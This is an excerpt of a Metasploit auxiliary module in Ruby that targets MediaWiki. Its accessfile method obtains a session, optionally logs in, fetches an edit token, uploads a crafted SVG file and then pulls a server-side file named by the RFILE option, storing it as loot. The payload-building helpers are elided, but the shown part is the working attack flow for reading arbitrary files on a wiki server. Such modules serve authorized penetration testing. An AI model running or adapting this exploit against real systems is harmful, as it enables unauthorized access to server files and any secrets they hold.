...
class MetasploitModule < Msf::Auxiliary
  ...
  def accessfile(rhost)
    vprint_status("MediaWiki - Getting unauthenticated session...")
    @wiki_session_name, @wiki_session = get_first_session
    if @wiki_session.nil?
      print_error("MediaWiki - Failed to get unauthenticated session...")
      return
    end
    vprint_status("Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")

    if @user and not @user.empty? and @password and not @password.empty?
      vprint_status("MediaWiki - Getting login token...")
      @login_token = get_login_token
      if @login_token.nil?
        print_error("MediaWiki - Failed to get login token")
        return
      end
      vprint_status("Logintoken: #{@login_token}")

      if not authenticate
        print_error("MediaWiki - Failed to authenticate")
        return
      end
      vprint_status("Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}")
      vprint_status("Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}")
      vprint_status("Session cookie: #{@wiki_session_name}=#{@wiki_session}")
    end

    vprint_status("MediaWiki - Getting edit token...")
    @edit_token = get_edit_token
    if @edit_token.nil?
      print_error("MediaWiki - Failed to get edit token")
      return
    end
    vprint_status("Edittoken: #{@edit_token}")

    vprint_status("MediaWiki - Uploading SVG file...")
    @svg_uri = upload_file
    if @svg_uri.nil?
      print_error("MediaWiki - Failed to upload SVG file")
      return
    end
    vprint_status("SVG URI: #{@svg_uri}")

    vprint_status("MediaWiki - Retrieving remote file...")
    loot = read_data
    if loot.nil? or loot.empty?
      print_error("MediaWiki - Failed to retrieve remote file")
      return
    end

    f = ::File.basename(datastore['RFILE'])
    path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
    print_good("MediaWiki - #{datastore['RFILE']} saved in #{path}")
  end
